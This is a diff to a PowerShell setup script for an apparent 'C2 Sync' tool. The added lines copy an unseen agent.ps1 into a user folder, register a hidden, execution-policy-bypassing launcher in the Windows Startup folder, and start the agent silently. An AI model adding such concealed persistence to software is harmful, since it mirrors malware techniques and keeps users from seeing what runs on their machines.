@@ -138,6 +138,16 @@ $utf8 = New-Object System.Text.UTF8Encoding $false
 )
 
 Copy-Item (Join-Path $Here "transfer.ps1") (Join-Path $SyncHome "transfer.ps1") -Force
+Copy-Item (Join-Path $Here "agent.ps1") (Join-Path $SyncHome "agent.ps1") -Force
+
+$agentLaunch = Join-Path $SyncHome "agent-launch.cmd"
+@"
+@echo off
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%USERPROFILE%\.c2-sync\agent.ps1"
+"@ | Set-Content -Path $agentLaunch -Encoding ASCII
+$startup = Join-Path ([Environment]::GetFolderPath("Startup")) "C2 Sync Helper.cmd"
+Copy-Item $agentLaunch $startup -Force
+Start-Process -FilePath "powershell" -WindowStyle Hidden -ArgumentList @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", (Join-Path $SyncHome "agent.ps1"))
 
 $launch = Join-Path $SyncHome "transfer-launch.cmd"
 @"
